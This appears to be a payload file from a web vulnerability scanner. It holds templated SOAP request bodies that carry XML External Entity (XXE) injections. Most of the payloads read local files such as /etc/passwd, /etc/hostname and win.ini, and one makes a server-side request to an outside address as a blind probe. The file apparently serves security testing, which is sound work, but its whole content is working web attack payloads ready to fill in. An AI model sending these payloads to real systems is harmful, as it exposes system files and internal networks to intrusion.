payload.body: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body> <{{OPERATION}} xmlns="{{NAMESPACE}}"> <{{PARAM}}>&xxe;</{{PARAM}}> </{{OPERATION}}> </soap:Body> </soap:Envelope>

payload.description: Windows win.ini read via SYSTEM entity
payload.body: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body> <{{OPERATION}} xmlns="{{NAMESPACE}}"> <{{PARAM}}>&xxe;</{{PARAM}}> </{{OPERATION}}> </soap:Body> </soap:Envelope>

payload.description: SSRF via HTTP external entity — blind timing probe
payload.body: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.0.2.1/aegis-xxe-probe"> ]> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body> <{{OPERATION}} xmlns="{{NAMESPACE}}"> <{{PARAM}}>&xxe;</{{PARAM}}> </{{OPERATION}}> </soap:Body> </soap:Envelope>

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body> <{{OPERATION}} xmlns="{{NAMESPACE}}"> <{{PARAM}}>&xxe;</{{PARAM}}> </{{OPERATION}}> </soap:Body> </soap:Envelope>
